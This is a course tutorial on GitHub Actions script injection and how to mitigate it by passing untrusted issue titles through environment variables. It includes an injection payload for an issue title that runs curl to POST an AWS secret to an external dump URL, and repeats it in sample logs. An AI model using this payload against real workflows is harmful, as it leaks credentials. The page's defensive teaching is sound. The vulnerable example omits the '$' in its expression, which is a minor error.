# Mitigating Script Injection Attack

Source: https://notes.kodekloud.com/docs/GitHub-Actions-Certification/Security-Guide/Mitigating-Script-Injection-Attack/page

Protect CI/CD pipelines from script injection attacks by sanitizing untrusted input to prevent command execution and secret leaks.

Protect your CI/CD pipelines by ensuring untrusted input cannot execute malicious commands or leak secrets. Inline scripts that interpolate user-controlled data directly in shell code are especially vulnerable.

## Problem: Inline Script Injection

A workflow that reads an issue title into a shell variable without sanitization allows an attacker to inject arbitrary commands:

```yaml theme={null}
name: Label Issues (Script Injection)
on:
  issues:
    types: [opened]

jobs:
  assign-label:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4.1.1
      - name: Add a Label
        env:
          AWS_SECRET_ACCESS_KEY: ${{ secrets.AWS_SECRET_ACCESS_KEY }}
        run: |
          issue_title="{{ github.event.issue.title }}"
          if [[ "$issue_title" == *"bug"* ]]; then
            echo "Issue is about a bug!"
            echo "Assigning Label - BUG..."
          else
            echo "Not a bug"
          fi
```

A malicious issue title such as:

```bash theme={null}
bug"; curl --request POST --data anything=$AWS_SECRET_ACCESS_KEY \
  https://httpdump.app/dumps/c2a7d181-5768-4cb5-a930-4d016c38d7d2
```

would run the `curl` command and expose your secret.

## Exploit Demonstration

1. Open a new issue with the payload above.
2. Check workflow logs:

```bash theme={null}
Run if [[ "$issue_title" == *"bug"* ]]; then ...
shell: /usr/bin/bash -e {0}
env:
  AWS_SECRET_ACCESS_KEY: ***
  issue_title: bug"; curl --request POST --data anything=$AWS_SECRET_ACCESS_KEY \
    https://httpdump.app/dumps/c2a7d181-5768-4cb5-a930-4d016c38d7d2
```

The injected `curl` runs before your conditional, leaking secrets.

## Solution: Use Environment Variables for Expressions

Store GitHub expressions in environment variables. Because Actions resolves `${{ }}` outside the shell, any injected payload remains inert.

```yaml theme={null}
name: Label Issues (Script Injection Mitigated)
on:
  issues:
    types: [opened]

jobs:
  assign-label:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4.1.1
      - name: Add a Label
        env:
          AWS_SECRET_ACCESS_KEY: ${{ secrets.AWS_SECRET_ACCESS_KEY }}
          issue_title: '${{ github.event.issue.title }}'
        run: |
          if [[ "$issue_title" == *"bug"* ]]; then
            echo "Issue is about a bug!"
            echo "Assigning Label - BUG"
          else
            echo "Not a bug"
          fi
```

<Callout icon="lightbulb">
  Quoting the expression (`'${{ ... }}'`) ensures the shell sees it as a literal. Any embedded quotes or commands will not be evaluated.
</Callout>

| Approach                                   | Risk                                   | Mitigation                                             |
| ------------------------------------------ | -------------------------------------- | ------------------------------------------------------ |
| Inline interpolation in `run` script       | Arbitrary code execution, secret leaks | Use `env` variables with quoted `${{ }}` expressions   |
| Storing untrusted data in files or scripts | Payload injection at parse time        | Avoid inline scripts; prefer action inputs or env vars |

## Demonstration of Safe Execution

```bash theme={null}
